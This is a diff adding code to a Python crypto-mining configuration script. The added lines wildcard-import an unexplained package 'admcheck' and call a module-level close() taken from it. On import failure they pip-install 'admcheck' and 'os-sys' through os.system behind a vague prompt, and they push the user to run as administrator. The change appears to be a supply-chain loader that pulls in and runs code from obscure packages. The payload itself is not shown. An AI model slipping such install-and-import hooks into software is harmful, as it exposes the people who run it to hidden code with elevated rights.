@@ -1,7 +1,16 @@
+# original by Dev-Nergis please show the original some love
+
 import json
 import os
 import sys
+try:
+ from admcheck.main import *
+except:
+ input("missing modules would you like to install? ")
+ os.system("pip install admcheck && pip install requests && pip install os-sys")
+ print("installed modules please restart")
 
+close()
 def resource_path(relative_path):
     try:
         base_path = sys._MEIPASS
@@ -11,6 +20,10 @@ def resource_path(relative_path):
     return os.path.join(base_path, relative_path)
 
 def save():
+    if is_Admin():
+        print("")
+    else:
+        print("Failed to apply msr mod please restart as administrator")
     c = input("COIN: ")
     y = input("YOUR_WALLET_ADDRESS: ")
     w = input("WORKER_NAME: ")
